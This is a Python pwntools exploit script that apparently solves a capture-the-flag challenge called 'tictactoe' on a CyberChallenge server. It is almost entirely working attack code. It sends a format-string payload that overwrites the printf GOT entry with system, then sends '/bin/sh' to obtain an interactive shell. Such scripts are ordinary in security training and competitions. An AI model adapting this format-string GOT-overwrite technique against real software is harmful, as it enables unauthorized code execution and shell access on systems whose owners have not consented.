#!/usr/bin/env python3
from pwn import *

bin_name = "./tictactoe"
elf = context.binary = ELF(bin_name)
context.terminal = ('gnome-terminal', '-e')

def conn():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript='b main\ncontinue\n')
    elif args.REMOTE:
        return remote("tictactoe.challs.cyberchallenge.it", 9132)
    else:
        return process(elf.path)

def main():
    r = conn()
    offset = 15
    r.recv()
    payload = fmtstr_payload(offset,{elf.got['printf']:elf.plt['system']})
    r.sendline(payload)
    r.recv()
    r.sendline(b'/bin/sh')
    r.interactive()

if __name__ == "__main__":
    main()
